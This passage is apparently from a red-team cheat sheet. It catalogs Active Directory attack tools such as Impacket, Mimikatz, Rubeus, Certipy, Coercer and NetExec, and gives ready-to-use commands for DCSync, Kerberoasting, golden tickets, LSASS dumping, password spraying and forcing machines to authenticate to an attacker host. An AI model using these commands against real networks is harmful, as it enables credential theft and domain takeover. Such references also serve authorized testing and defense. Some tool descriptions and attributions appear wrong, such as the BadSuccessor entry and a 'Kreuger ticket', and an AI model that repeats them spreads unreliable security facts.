**Description:** Linux tools for enumerating Windows/Samba AD information via SMB/RPC, including users, groups, shares, password policy, and OS info.

**Key Features:**
- SMB null session enumeration
- RID cycling for user enumeration
- OS version detection
- Share enumeration
- Password policy retrieval

**Red Team Use:**
- Initial enumeration from Linux with no creds (null session)
- Network perimeter testing
- Anonymous share hunting

**Key Commands:**
```bash
# Full enumeration (null session)
enum4linux-ng target -A

# With creds
enum4linux-ng target -u user -p pass -A

# RID cycling
enum4linux-ng target -u user -p pass -R
```

---

### smbmap / smbclient

| Property | Value |
|----------|-------|
| **Vendor** | Shawn Evans (smbmap), Samba (smbclient) |
| **Category** | ENUM, LAT |
| **Platform** | Linux, macOS |
| **Cost** | Free (open source) |
| **Install** | `pip install smbmap` / `apt install smbclient` |
| **Repo** | https://github.com/ShawnDEvans/smbmap |

**Description:** SMB share enumeration (smbmap) and file transfer (smbclient) tools. List permissions, download/upload files, and execute commands over SMB.

**Key Features:**
- Share permission mapping (read/write/deny)
- Recursive directory listing
- File download/upload
- Remote command execution
- Pass-the-Hash support

**Red Team Use:**
- Share recon for lateral movement
- SYSVOL file access for GPP passwords
- Admin share access for file retrieval

**Key Commands:**
```bash
# List shares with permissions
smbmap -H target -u user -p pass

# Recursive listing
smbmap -H target -u user -p pass -R

# Connect to share
smbclient //target/C$ -U domain/user%pass
```

---

### ADACLScanner

| Property | Value |
|----------|-------|
| **Vendor** | Canis Lupus |
| **Category** | ENUM, GPO |
| **Platform** | Windows |
| **Cost** | Free (open source) |
| **Install** | Download from GitHub |
| **Repo** | https://github.com/canix1/ADACLScanner |

**Description:** AD ACL scanning tool that enumerates all domain ACLs and identifies risky permissions, expose accounts, and delegation paths.

**Key Features:**
- Scan all AD object ACLs
- Identify principals with dangerous permissions
- Export to CSV/HTML
- Report on privileged group ACLs

**Red Team Use:**
- Identify ACL abuse paths
- Find over-permissioned accounts
- Validate BloodHound ACL findings

---

### AD-Miner

| Property | Value |
|----------|-------|
| **Vendor** | Orange Cyberdefense |
| **Category** | ENUM |
| **Platform** | PowerShell |
| **Cost** | Free (open source) |
| **Install** | `Import-Module AD-Miner.ps1` |
| **Repo** | https://github.com/Orange-Cyberdefense/AD-Miner |

**Description:** PowerShell AD security analysis tool providing risk assessments and visualizations of AD security posture.

**Key Features:**
- 20+ risk indicators
- Attack path identification
- Risk scoring
- HTML reporting
- CIS benchmark integration

**Red Team Use:**
- Quick posture assessment
- Identify low-hanging fruit
- Reporting

---

### adPEAS

| Property | Value |
|----------|-------|
| **Vendor** | Mazarat |
| **Category** | ENUM, PE |
| **Platform** | Windows |
| **Cost** | Free (open source) |
| **Install** | Download binary |
| **Repo** | https://github.com/mazarat/adPEAS |

**Description:** AD privilege escalation attack surface tool. Similar to WinPEAS but focused specifically on AD attack paths.

**Key Features:**
- ADCS vulnerability scanning (ESC1-ESC13)
- Kerberos delegation abuse paths
- ACL abuse identification
- GPO abuse paths
- Privileged session detection

**Red Team Use:**
- AD-specific privilege escalation checks
- Identify all escalation vectors
- Combine with BloodHound findings

---

### GoodHound

| Property | Value |
|----------|-------|
| **Vendor** | idnahacks |
| **Category** | ENUM |
| **Platform** | Python |
| **Cost** | Free (open source) |
| **Install** | `git clone` |
| **Repo** | https://github.com/idnahacks/GoodHound |

**Description:** BloodHound output enrichment tool that uses SharpHound data to identify the most efficient attack paths and prioritize targets.

**Key Features:**
- Calculates effective attack paths
- Priority-based target identification
- Helps interpret large BloodHound datasets
- Excel/CSV output for reporting

**Red Team Use:**
- Post-process BloodHound data
- Identify shortest paths more efficiently
- Reporting for non-technical stakeholders

---

### PlumHound

| Property | Value |
|----------|-------|
| **Vendor** | Defensive Origins |
| **Category** | ENUM |
| **Platform** | Linux, Windows |
| **Cost** | Free (open source) |
| **Install** | Download binary |
| **Repo** | https://github.com/PlumHound/PlumHound |

**Description:** BloodHound task automation and report generation tool that runs pre-built and custom Cypher queries against BloodHound/Neo4j.

**Key Features:**
- 100+ built-in Cypher queries
- Automated query execution
- HTML/CSV report generation
- ADCS query support
- Blue team / red team query sets

**Red Team Use:**
- Automate BloodHound analysis
- Generate client-facing reports
- Run MS-ADCS attack path queries

**Key Commands:**
```bash
# Run all queries
PlumHound --bloodhound-data users.json groups.json computers.json --html -p

# Specific query set
PlumHound --tasks tasks/default.txt --html -p
```

---

### PowerSharpPack

| Property | Value |
|----------|-------|
| **Vendor** | S3cur3Th1sSh1t |
| **Category** | ENUM, CRED, LAT, PE |
| **Platform** | Windows (PS + C#) |
| **Cost** | Free (open source) |
| **Install** | Download .ps1 from GitHub |
| **Repo** | https://github.com/S3cur3Th1sSh1t/PowerSharpPack |

**Description:** Bundle of popular C# offensive security tools wrapped in PowerShell for in-memory execution. One-liner load and execute.

**Key Features:**
- In-memory execution of SharpHound, Rubeus, Seatbelt, SharpUp, etc.
- PowerShell reflection loading
- Bypass AMSI constraints
- No disk writes

**Red Team Use:**
- Deploy multiple tools without dropping binaries
- Bypass application whitelisting
- Load tools via C2

---

### Group3r

| Property | Value |
|----------|-------|
| **Vendor** | Outflank |
| **Category** | GPO, ENUM |
| **Platform** | Windows |
| **Cost** | Free (open source) |
| **Install** | Download binary |
| **Repo** | https://github.com/outflanknl/Group3r |

**Description:** GPO auditing tool that finds vulnerabilities and misconfigurations in Group Policy Objects.

**Key Features:**
- Scans all GPOs for security issues
- Identifies vulnerable settings
- Export to CSV/HTML
- Finds GPO-related privilege escalation paths

**Red Team Use:**
- Identify GPO abuse paths
- Find passwords in GPO preferences (GPP)
- Discovery of overly permissive GPOs

---

### GPO-Hound

| Property | Value |
|----------|-------|
| **Vendor** | Orange Cyberdefense |
| **Category** | GPO, ENUM |
| **Platform** | PowerShell |
| **Cost** | Free (open source) |
| **Install** | Download .ps1 |
| **Repo** | https://github.com/Orange-Cyberdefense/GPO-Hound |

**Description:** PowerShell tool that extracts GPO relationships for BloodHound ingestion, enabling GPO attack path visualization.

**Key Features:**
- Ingests GPO data into BloodHound
- Enables GPO abuse path queries
- Identifies GPO-to-computer/user links

**Red Team Use:**
- Ingest GPO data into BloodHound for path analysis
- Identify GPO-based privilege escalation vectors

---

### GPORemoteAccessPolicy

| Property | Value |
|----------|-------|
| **Vendor** | NotMedic |
| **Category** | GPO, LAT |
| **Platform** | PowerShell |
| **Cost** | Free (open source) |
| **Install** | Download .ps1 |
| **Repo** | https://github.com/NotMedic/GPORemoteAccessPolicy |

**Description:** Tool to enumerate GPO remote access policies, including WinRM, RDP, PowerShell Remoting, and firewall rules configured via GPO.

**Key Features:**
- Identify remote access enabled by GPO
- Firewall rules analysis
- WinRM/RDP policy discovery
- Lateral movement surface enumeration

**Red Team Use:**
- Find lateral movement opportunities
- Identify GPO-enabled admin access
- Map remote management capabilities

---

### PowerPUG

| Property | Value |
|----------|-------|
| **Vendor** | Mike Lambert |
| **Category** | ENUM |
| **Platform** | PowerShell |
| **Cost** | Free (open source) |
| **Install** | Download .ps1 |
| **Repo** | https://github.com/M4net/PowerPUG |

**Description:** PowerShell User Group (PUG) enumeration tool for AD security assessments.

**Key Features:**
- Privileged group member analysis
- Nested group resolution
- Group membership change detection
- Shared privileged account identification

**Red Team Use:**
- Map nested group membership
- Identify escalation paths through groups

---

### GPOZaurr

| Property | Value |
|----------|-------|
| **Vendor** | EvotecIT |
| **Category** | GPO |
| **Platform** | PowerShell |
| **Cost** | Free (open source) |
| **Install** | `Install-Module GPOZaurr` |
| **Repo** | https://github.com/EvotecIT/GPOZaurr |

**Description:** PowerShell module for comprehensive GPO management, auditing, and troubleshooting with security-focused reporting.

**Key Features:**
- GPO security filtering analysis
- WMI filtering audit
- GPO backup and restore
- Security reports
- Cross-domain GPO management

**Red Team Use:**
- Audit GPO misconfigurations
- Identify WMI filter bypasses
- Find backup GPO files with passwords

---

### LockSmith

| Property | Value |
|----------|-------|
| **Vendor** | Trimarc |
| **Category** | ADCS, ENUM |
| **Platform** | PowerShell |
| **Cost** | Free (open source) |
| **Install** | Download .ps1 |
| **Repo** | https://github.com/TrimarcJake/LockSmith |

**Description:** PowerShell-based ADCS (Active Directory Certificate Services) security auditing tool.

**Key Features:**
- ADCS template vulnerability scan (ESC1-ESC13)
- CA security configuration audit
- Certificate enrollment rights analysis
- Export to HTML/CSV

**Red Team Use:**
- ADCS vulnerability assessment
- Identify certificate template abuse paths
- Complement Certipy/Certify findings

---

### BlueTuxedo

| Property | Value |
|----------|-------|
| **Vendor** | Trimarc |
| **Category** | DNS, ENUM |
| **Platform** | PowerShell |
| **Cost** | Free (open source) |
| **Install** | Download .ps1 |
| **Repo** | https://github.com/TrimarcJake/BlueTuxedo |

**Description:** PowerShell tool auditing AD-integrated DNS zones for security issues like zone transfer rights, dynamic update permissions, and insecure registrations.

**Key Features:**
- DNS zone security analysis
- Zone transfer permissions audit
- Dynamic update permission audit
- DNS record enumeration
- Export to HTML/CSV

**Red Team Use:**
- Identify DNS-based attack surface
- Find AD DNS misconfigurations
- Subdomain enumeration via AD DNS

---

### BadSuccessor / SharpSuccessor

| Property | Value |
|----------|-------|
| **Vendor** | Cn33liz |
| **Category** | PE, PERS |
| **Platform** | Windows |
| **Cost** | Free (open source) |
| **Install** | Download binary |
| **Repo** | https://github.com/Cn33liz/BadSuccessor |

**Description:** AD privileged attribute hijacking tool targeting the `adminCount` attribute and other privileged account properties.

**Key Features:**
- Purely PowerShell (BadSuccessor) and C# (SharpSuccessor)
- Attack adminSDHolder and SDProp
- Modify privileged account attributes
- Persistence via AdminSDHolder

**Red Team Use:**
- Persistence via AdminSDHolder modifications
- Bypass privileged attribute protection
- Escalate from non-admin to admin via SDProp

---

## <span style="color:rgb(146, 208, 80)">Credential Access & Theft</span>

---

### Impacket

| Property | Value |
|----------|-------|
| **Vendor** | Fortra (SecureAuth) |
| **Category** | CRED, LAT, KERB, PE |
| **Platform** | Linux, macOS |
| **Cost** | Free (open source) |
| **Install** | `pip install impacket` / `apt install impacket-scripts` |
| **Repo** | https://github.com/fortra/impacket |

**Description:** Comprehensive Python library for working with network protocols. The de facto AD red teaming framework with dozens of scripts for credential dumping, lateral movement, Kerberos abuse, and more.

**Key Features:**
- `secretsdump.py`: Dump AD hashes via DCSync, SAM, LSASS
- `GetUserSPNs.py`: Kerberoasting
- `GetNPUsers.py`: AS-REP roasting
- `wmiexec.py`: WMI remote execution
- `psexec.py`: PSExec remote execution
- `smbexec.py`: SMB remote execution
- `atexec.py`: Scheduled task execution
- `ticketer.py`: Golden/silver ticket creation
- `getST.py`: S4U2Self/S4U2Proxy delegation abuse
- `getTGT.py`: TGT request
- `ntlmrelayx.py`: NTLM relay with multiple protocols
- `lookupsid.py`: SID brute force
- `reg.py`: Remote registry access
- `rpcdump.py`: RPC endpoint enumeration

**Red Team Use:**
- Primary toolset for AD exploitation
- DCSync for domain credential theft
- Kerberos roast attacks
- Lateral movement across all protocols

**Key Commands:**
```bash
# DCSync (dump all domain hashes)
secretsdump.py domain/user:pass@dc01.domain.local

# Kerberoasting
GetUserSPNs.py domain/user:pass -dc-ip DC_IP -request

# AS-REP roasting
GetNPUsers.py domain/ -dc-ip DC_IP -usersfile users.txt -format hashcat

# WMI exec
wmiexec.py domain/user:pass@target

# PSExec
psexec.py domain/user:pass@target

# Golden ticket
ticketer.py -nthash NTLM -domain-sid SID -domain domain.local user

# S4U delegation abuse
getST.py -spn cifs/target.domain.local domain/user:pass -impersonate administrator

# NTLM relay
ntlmrelayx.py -tf targets.txt -smb2support
```

---

### Mimikatz

| Property | Value |
|----------|-------|
| **Vendor** | Benjamin Delpy (@gentilkiwi) |
| **Category** | CRED, KERB, PE |
| **Platform** | Windows |
| **Cost** | Free (open source) |
| **Install** | Download binary from GitHub |
| **Repo** | https://github.com/gentilkiwi/mimikatz |

**Description:** The legendary Windows credential extraction tool. Dumps passwords, hashes, PINs, Kerberos tickets from memory, and performs pass-the-hash, pass-the-ticket, golden/silver ticket attacks.

**Key Features:**
- `sekurlsa::logonpasswords`: dump credentials from LSASS
- `lsadump::dcsync`: DCSync attack
- `lsadump::sam`: local SAM dump
- `lsadump::lsa`: LSA secrets dump
- `kerberos::golden`: golden ticket creation
- `kerberos::silver`: silver ticket creation
- `kerberos::ptt`: pass-the-ticket
- `sekurlsa::pth`: pass-the-hash (create process)
- `sekurlsa::kerberos`: Kerberos ticket extraction
- `dpapi::*`: DPAPI abuse
- `crypto::*`: certificate extraction

**Red Team Use:**
- Primary credential dumping tool
- Golden/silver ticket persistence
- DCSync with low privileges
- Pass-the-hash for lateral movement

**Key Commands:**
```powershell
# Elevate to DEBUG
privilege::debug

# Dump all credentials
sekurlsa::logonpasswords

# DCSync
lsadump::dcsync /domain:domain.local /user:krbtgt

# Golden ticket
kerberos::golden /domain:domain.local /sid:S-1-5-21-... /krbtgt:NTLM /user:Administrator /id:500 /ptt

# Pass-the-hash
sekurlsa::pth /user:Administrator /domain:domain.local /ntlm:NTLM /run:powershell

# SAM dump
lsadump::sam

# LSA secrets
lsadump::secrets
```

---

### Rubeus

| Property | Value |
|----------|-------|
| **Vendor** | Will Schroeder (@harmj0y) |
| **Category** | KERB, CRED |
| **Platform** | Windows |
| **Cost** | Free (open source) |
| **Install** | Download binary from GitHub; compile with Visual Studio |
| **Repo** | https://github.com/GhostPack/Rubeus |

**Description:** C# toolset for raw Kerberos interaction in AD. Specializes in ticket requests, abuse, and Kerberos protocol attacks.

**Key Features:**
- Kerberoasting (ask/renew TGS with RC4)
- AS-REP roasting
- Overpass-the-hash (ask TGT with NTLM)
- Pass-the-ticket (PTT)
- S4U2Self/S4U2Proxy abuse (constrained/unconstrained delegation)
- Kerberos ticket renewal/export
- Kerberos ticket brute force
- Golden/silver ticket creation (via Kreuger ticket)
- Kerberos ticket cache manipulation

**Red Team Use:**
- Kerberoasting with known accounts
- Delegation abuse (constrained/unconstrained)
- Overpass-the-hash for lateral movement
- Ticket manipulation in-memory

**Key Commands:**
```powershell
# Kerberoasting
Rubeus.exe kerberoast /outfile:hashes.txt

# AS-REP roasting
Rubeus.exe asreproast /outfile:asrep.txt

# Overpass-the-hash
Rubeus.exe asktgt /domain:domain.local /user:Administrator /rc4:NTLM /ptt

# Pass-the-ticket
Rubeus.exe ptt /ticket:base64

# Delegation abuse (S4U)
Rubeus.exe s4u /user:svc_account /rc4:NTLM /impersonateuser:Administrator /msdsspn:cifs/target.domain.local /altservice:ldap

# Ask TGT with certificate (PKINIT)
Rubeus.exe asktgt /user:user /certificate:base64 /password:pass
```

---

### Certipy

| Property | Value |
|----------|-------|
| **Vendor** | Ly4k |
| **Category** | ADCS, CRED, PE |
| **Platform** | Linux, macOS |
| **Cost** | Free (open source) |
| **Install** | `pip install certipy-ad` |
| **Repo** | https://github.com/ly4k/Certipy |

**Description:** Python tool for ADCS (Active Directory Certificate Services) enumeration and abuse. Implements all known ESC attacks, certificate theft, and PKI-based persistence.

**Key Features:**
- ADCS enumeration (templates, CAs, issuance policies)
- ESC1-ESC13 attack implementation
- Certificate request with SAN
- Certificate authentication
- Certificate theft (via PKCS12)
- Golden certificate (CA certificate theft)
- Shadow Credentials (KeyCredentialLink manipulation)
- PKINIT Kerberos authentication with certificates

**Red Team Use:**
- ADCS attack chain exploitation
- Certificate-based domain persistence
- ESC1/ESC2/ESC3/ESC4/ESC5/ESC6/ESC7/ESC8/ESC9/ESC10/ESC11/ESC12/ESC13

**Key Commands:**
```bash
# Find ADCS servers and vulnerable templates
certipy find -u user@domain.local -p pass -dc-ip DC_IP

# Request certificate with SAN (ESC1)
certipy req -u user@domain.local -p pass -ca CA-NAME -template VULN-TEMPLATE -upn administrator@domain.local

# Authenticate with certificate
certipy auth -pfx cert.pfx -dc-ip DC_IP

# Shadow credentials
certipy shadow auto -u user@domain.local -p pass -account target_user

# CA certificate theft (ESC7)
certipy ca -u user@domain.local -p pass -ca CA-NAME -get-cert

# Golden certificate (forge with CA cert)
certipy forge -ca-pfx CA.pfx -upn administrator@domain.local -subject "CN=Administrator"
```

---

### Certify

| Property | Value |
|----------|-------|
| **Vendor** | Will Schroeder / Lee Christensen |
| **Category** | ADCS, CRED |
| **Platform** | Windows |
| **Cost** | Free (open source) |
| **Install** | Download binary from GitHub; compile with Visual Studio |
| **Repo** | https://github.com/GhostPack/Certify |

**Description:** C# implementation of ADCS enumeration and abuse tool (Windows equivalent of Certipy).

**Key Features:**
- ADCS server/template enumeration
- Vulnerable template identification (ESC1-ESC13)
- Certificate request with SAN
- Certificate download
- Certificate info inspection
- Client authentication template check

**Red Team Use:**
- ADCS recon from Windows hosts
- Certificate request with SAN for privilege escalation
- No Python dependency on Windows targets

**Key Commands:**
```powershell
# Find ADCS templates
Certify.exe find

# Find vulnerable templates only
Certify.exe find /vulnerable

# Request certificate with altname (ESC1)
Certify.exe request /ca:CA-SERVER\CA-NAME /template:Vulnerable-Template /altname:administrator@domain.local
```

---

### SharpDPAPI

| Property | Value |
|----------|-------|
| **Vendor** | Will Schroeder (@harmj0y) |
| **Category** | CRED |
| **Platform** | Windows |
| **Cost** | Free (open source) |
| **Install** | Download binary from GitHub |
| **Repo** | https://github.com/GhostPack/SharpDPAPI |

**Description:** C# port of Mimikatz's DPAPI functionality for decrypting Windows Data Protection API (DPAPI) protected data.

**Key Features:**
- Master key decryption (password, NTLM, PVK, RPC)
- Machine master key decryption
- Domain backup key extraction
- Chrome/Edge browser data decryption
- IIS application pool credential decryption
- RDP saved credential decryption

**Red Team Use:**
- Extract domain DPAPI backup key for offline decryption
- Dump Chrome/Edge stored passwords
- Decrypt RDP and IIS credentials

**Key Commands:**
```powershell
# Domain backup key
SharpDPAPI.exe backupkeys /server:dc01.domain.local

# Chrome passwords
SharpChrome.exe logins

# Decrypt all
SharpDPAPI.exe masterkeys /rpc

# Machine keys
SharpDPAPI.exe machinemasterkeys /rpc
```

---

### SharpChrome

| Property | Value |
|----------|-------|
| **Vendor** | Will Schroeder (@harmj0y) |
| **Category** | CRED |
| **Platform** | Windows |
| **Cost** | Free (open source) |
| **Install** | Part of SharpDPAPI; download binary |
| **Repo** | https://github.com/GhostPack/SharpDPAPI |

**Description:** C# tool for recovering Chromium-based browser credentials including passwords, cookies, history, and credit cards.

**Key Features:**
- Recover saved passwords from Chrome/Edge/Brave
- Recover session cookies
- Recover browser history
- Recover credit card data
- Export cookies in Netscape format

**Red Team Use:**
- Extract credentials from browser stores
- Steal session cookies for session hijacking
- Harvest credit card data from browsers

---

### SharpDump

| Property | Value |
|----------|-------|
| **Vendor** | Will Schroeder (@harmj0y) |
| **Category** | CRED |
| **Platform** | Windows |
| **Cost** | Free (open source) |
| **Install** | Download binary from GitHub |
| **Repo** | https://github.com/GhostPack/SharpDump |

**Description:** C# tool for dumping LSASS process memory for offline credential extraction.

**Key Features:**
- Minidump of LSASS process
- Output compatible with Mimikatz `sekurlsa::minidump`
- Stealthier than raw Mimikatz
- .NET reflection loading

**Red Team Use:**
- Dump LSASS for offline credential extraction
- Transfer dump to attack host for processing
- Bypass AV that catches Mimikatz in memory

**Key Commands:**
```powershell
# Dump LSASS
SharpDump.exe

# Output to specific file
SharpDump.exe C:\temp\lsass.dmp
```

---

### PKINITtools

| Property | Value |
|----------|-------|
| **Vendor** | Dirk-jan Molma |
| **Category** | KERB, CRED |
| **Platform** | Linux, macOS |
| **Cost** | Free (open source) |
| **Install** | `git clone && pip install` |
| **Repo** | https://github.com/dirkjanm/PKINITtools |

**Description:** Python tools for Kerberos PKINIT authentication, enabling TGT requests using certificates and NTLM hash extraction from PKINIT.

**Key Features:**
- `gettgtpkinit.py`: Get TGT using certificate (PKINIT)
- `getnthash.py`: Extract NTLM hash from PKINIT TGT

**Red Team Use:**
- Authenticate using stolen certificates
- Extract NTLM hash from certificate-based auth
- Use certificates for Kerberos authentication

**Key Commands:**
```bash
# Get TGT with certificate
gettgtpkinit.py -cert-pfx certificate.pfx domain.local/user user.ccache

# Extract NTLM from PKINIT
getnthash.py -key AS-REP_KEY domain.local/user user.ccache
```

---

### pyWhisker

| Property | Value |
|----------|-------|
| **Vendor** | ShutdownRepo |
| **Category** | CRED, PERS |
| **Platform** | Linux, macOS |
| **Cost** | Free (open source) |
| **Install** | `pip install pywhisker` |
| **Repo** | https://github.com/ShutdownRepo/pywhisker |

**Description:** Python tool for managing the msDS-KeyCredentialLink attribute (Shadow Credentials) on AD user/computer objects.

**Key Features:**
- Add/remove/list KeyCredentialLink entries
- Shadow Credentials attack (adds credential for TGT request)
- Certificate-based authentication
- Persistence via KeyCredentialLink

**Red Team Use:**
- Shadow Credentials attack for privilege escalation
- Persistence on domain user/computer accounts
- Bypass MFA requirements

**Key Commands:**
```bash
# Add shadow credential
pywhisker.py -d domain.local -u 'user' -p 'pass' --target 'targetuser' --action add --filename output

# List existing credentials
pywhisker.py -d domain.local -u 'user' -p 'pass' --target 'targetuser' --action list

# Remove credential
pywhisker.py -d domain.local -u 'user' -p 'pass' --target 'targetuser' --action remove --device-id DEVICE_ID
```

---

### LAPSToolkit

| Property | Value |
|----------|-------|
| **Vendor** | Harmj0y |
| **Category** | CRED, ENUM |
| **Platform** | Windows |
| **Cost** | Free (open source) |
| **Install** | Download .ps1 |
| **Repo** | https://github.com/leoloobeek/LAPSToolkit |

**Description:** PowerShell toolkit for auditing and exploiting Windows LAPS (Local Administrator Password Solution).

**Key Features:**
- LAPS deployment audit
- Identify computers with LAPS
- Extract LAPS passwords (if permitted)
- LAPS password expiration analysis

**Red Team Use:**
- Extract local admin passwords from AD
- Lateral movement using LAPS passwords
- Identify LAPS misconfigurations

**Key Commands:**
```powershell
# Search for LAPS-enabled computers
Get-LAPSComputers

# Extract LAPS password for specific computer
Get-LAPSPassword -ComputerName target

# Audit LAPS deployment
Find-LAPSDelegatedGroups
```

---

### DomainPasswordSpray

| Property | Value |
|----------|-------|
| **Vendor** | dafthack |
| **Category** | SPRAY |
| **Platform** | Windows, PowerShell |
| **Cost** | Free (open source) |
| **Install** | Download .ps1 |
| **Repo** | https://github.com/dafthack/DomainPasswordSpray |

**Description:** PowerShell tool for performing password spraying attacks against AD users. Automatically extracts domain users and policy.

**Key Features:**
- Automatic user enumeration (via LDAP)
- Automatic lockout threshold detection
- Password spraying with single password
- Password spraying with password list
- Export to CSV

**Red Team Use:**
- Password spraying against AD users
- Identify weak passwords without lockout

**Key Commands:**
```powershell
# Spray single password
Invoke-DomainPasswordSpray -Password "Spring2026!" -OutFile sprayed.csv

# Spray with password list
Invoke-DomainPasswordSpray -PasswordList passwords.txt -OutFile sprayed.csv

# Custom user list
Invoke-DomainPasswordSpray -UserList users.txt -Password "Fall2026!"
```

---

### gpp-decrypt

| Property | Value |
|----------|-------|
| **Vendor** | Various |
| **Category** | CRED |
| **Platform** | Linux |
| **Cost** | Free (open source) |
| **Install** | `apt install gpp-decrypt` |
| **Repo** | https://github.com/arnaudsoullie/letsread-gppdecrypt |

**Description:** Simple tool to decrypt Group Policy Preferences (GPP) cpassword values in SYSVOL.

**Key Features:**
- Decrypt AES-encrypted GPP passwords
- Works with Groups.xml, Services.xml, ScheduledTasks.xml, etc.

**Red Team Use:**
- Decrypt local admin passwords stored in SYSVOL
- Quick lateral movement vector

**Key Commands:**
```bash
gpp-decrypt encrypted_cpassword_string
```

---

## <span style="color:rgb(146, 208, 80)">Kerberos Abuse</span>

---

### Kerbrute

| Property | Value |
|----------|-------|
| **Vendor** | Ropnop |
| **Category** | KERB, SPRAY, ENUM |
| **Platform** | Linux, macOS, Windows |
| **Cost** | Free (open source) |
| **Install** | `go install github.com/ropnop/kerbrute@latest` / download binary |
| **Repo** | https://github.com/ropnop/kerbrute |

**Description:** Go tool for Kerberos pre-authentication abuse. Used for user enumeration, password spraying, and brute force via Kerberos.

**Key Features:**
- User enumeration (AS-REP errors differentiate valid/invalid users)
- Password spraying (single password, many users)
- Brute force (many passwords, single user)
- Output to file
- Multi-threaded

**Red Team Use:**
- Enumerate valid domain users without LDAP
- Password spraying without lockout risk (Kerberos policy)
- Identify AS-REP roastable accounts

**Key Commands:**
```bash
# User enumeration
kerbrute userenum -d domain.local users.txt --dc IP

# Password spray
kerbrute passwordspray -d domain.local users.txt "Fall2026!" --dc IP

# Brute force
kerbrute bruteuser -d domain.local passwords.txt username --dc IP
```

---

### KrbRelay / KrbRelayUp

| Property | Value |
|----------|-------|
| **Vendor** | Cubolico / Topotam |
| **Category** | RELAY, PE |
| **Platform** | Windows |
| **Cost** | Free (open source) |
| **Install** | Download binary from GitHub |
| **Repo** | https://github.com/cube0x0/KrbRelay |

**Description:** Kerberos relay attack tools. KrbRelay relays Kerberos authentication to LDAP for privilege escalation. KrbRelayUp achieves domain admin via various techniques.

**Key Features:**
- Kerberos relay to LDAP (via HTTP listener)
- Shadow Credentials via relay
- CLSID-based coercion
- KrbRelayUp: automated DA via relay chain

**Red Team Use:**
- Elevate from standard domain user to DA via relay
- Shadow Credentials without code execution on DC
- Bypass LDAP signing/channel binding

**Key Commands:**
```powershell
# KrbRelay (relay incoming HTTP to LDAP)
KrbRelay.exe -spn ldap/dc01.domain.local -clsid CLSID -shadowcred

# KrbRelayUp (automated escalation)
KrbRelayUp.exe -m shadowcred
```

---

### Coercer

| Property | Value |
|----------|-------|
| **Vendor** | Podalirius |
| **Category** | COERCE |
| **Platform** | Linux, macOS |
| **Cost** | Free (open source) |
| **Install** | `pip install coercer` |
| **Repo** | https://github.com/p0dalirius/Coercer |

**Description:** Automatic tool to coerce Windows machines to authenticate to an attacker-controlled machine via multiple RPC protocols (MS-EFSRPC, MS-RPRN, MS-DFSNM, etc.).

**Key Features:**
- 10+ coercion methods
- Automatic method detection
- Serve mode for external coercion
- Multi-target support
- NTLM/Kerberos auth

**Red Team Use:**
- Trigger NTLM authentication to relay server
- Force DC/auth to authenticate to ntlmrelayx.py
- Combined with ADCS relay for certificate theft

**Key Commands:**
```bash
# Coerce all methods
coercer coerce -l attacker_IP -t target_IP -u user -p pass -d domain.local

# Serve mode (generate coercion URL)
coercer serve -l attacker_IP -u user -p pass -d domain.local

# Specific method
coercer coerce -l attacker_IP -t target_IP --method "PetitPotam"
```

---

### PetitPotam

| Property | Value |
|----------|-------|
| **Vendor** | Topotam |
| **Category** | COERCE |
| **Platform** | Windows |
| **Cost** | Free (open source) |
| **Install** | Download binary; compile |
| **Repo** | https://github.com/topotam/PetitPotam |

**Description:** MS-EFSRPC coercion tool that forces a Windows machine to authenticate to an attacker-controlled server using the Encrypting File System Remote Protocol.

**Key Features:**
- Triggers authentication via EFSRPC
- Works against Domain Controllers
- No authentication required
- Can force DC to authenticate with computer account

**Red Team Use:**
- Force DC authentication for relay attacks
- Combined with ADCS Web Enrollment (ESC8) relay
- NTLM relay target identification

---

### PrinterBug (SpoolSample)

| Property | Value |
|----------|-------|
| **Vendor** | Lee Christensen (@tifkin_) |
| **Category** | COERCE |
| **Platform** | Windows |
| **Cost** | Free (open source) |
| **Install** | Download binary |
| **Repo** | https://github.com/leechristensen/SpoolSample |

**Description:** MS-RPRN (Print Spooler) coercion tool that forces a Windows machine to authenticate to an attacker-controlled server.

**Key Features:**
- Triggers authentication via Print Spooler RPC
- Works against Windows 7/Server 2008 R2 and newer
- Requires no special privileges
- Often called "PrinterBug"

**Red Team Use:**
- Trigger machine account authentication
- Combine with relay attacks
- Force DC auth for DCSync relay

---

## <span style="color:rgb(146, 208, 80)">Lateral Movement & Remote Execution</span>

---

### NetExec (formerly CrackMapExec)

| Property | Value |
|----------|-------|
| **Vendor** | Pennyw0rth / MP & others |
| **Category** | LAT, ENUM, CRED, SPRAY |
| **Platform** | Linux, macOS |
| **Cost** | Free (open source) |
| **Install** | `pip install netexec` |
| **Repo** | https://github.com/Pennyw0rth/NetExec |

**Description:** Network execution and exploitation tool. Successor to CrackMapExec. Automates credential validation, lateral movement, enumeration, and exploitation across multiple protocols.

**Key Features:**
- Protocols: SMB, LDAP, WINRM, SSH, FTP, WMI, MSSQL, VNC
- Credential validation (plaintext, NTLM, Kerberos)
- Enumeration (users, groups, shares, sessions, password policy)
- Lateral movement (SMB exec, WMI exec, WinRM exec)
- Password spraying across protocols
- Module system (extensible via Python)
- BloodHound data ingestion integration
- `netexec db` for centralized logging

**Red Team Use:**
- Primary tool for credential validation after extraction
- Automated lateral movement across domain
- Password spraying at scale
- Enumeration of all accessible hosts

**Key Commands:**
```bash
# Validate credentials
netexec smb target -u user -p pass

# Password spray
netexec smb targets.txt -u users.txt -p passwords.txt --continue-on-success

# Execute command
netexec smb target -u user -p pass -x whoami

# Local auth (non-domain)
netexec smb target -u localadmin -p pass --local-auth

# Module example
netexec smb target -u user -p pass -M lsassy

# Dump SAM
netexec smb target -u user -p pass --sam

# Dump LSA secrets
netexec smb target -u user -p pass --lsa

# WinRM shell
netexec winrm target -u user -p pass -x whoami

# LDAP enum with BloodHound
netexec ldap target -u user -p pass --bloodhound --collection All

# SMB spider
netexec smb target -u user -p pass -M spider_plus -o READ_ONLY=false
```

---

### CrackMapExec (legacy)

| Property | Value |
|----------|-------|
| **Vendor** | MP (byt3bl33d3r) |
| **Category** | LAT, ENUM, CRED |
| **Platform** | Linux, macOS |
| **Cost** | Free (open source) |
| **Install** | `pip install crackmapexec` |
| **Repo** | https://github.com/byt3bl33d3r/CrackMapExec |

**Description:** Legacy version of NetExec (formerly maintained). Still widely used but no longer actively developed. Same protocol support and module system.

**Key Features:**
- Same as NetExec (SMB, LDAP, WINRM, MSSQL, SSH)
- Module system with community modules
- Credential spraying and validation
- Lateral movement execution

**Red Team Use:**
- Some modules only available in CME
- Legacy infrastructure compatibility
- Still used in assessments (but migrating to NetExec)

**Key Commands:**
```bash
crackmapexec smb target -u user -p pass
crackmapexec smb target -u user -p pass -M mimikatz
```

---

### evil-winrm

| Property | Value |
|----------|-------|
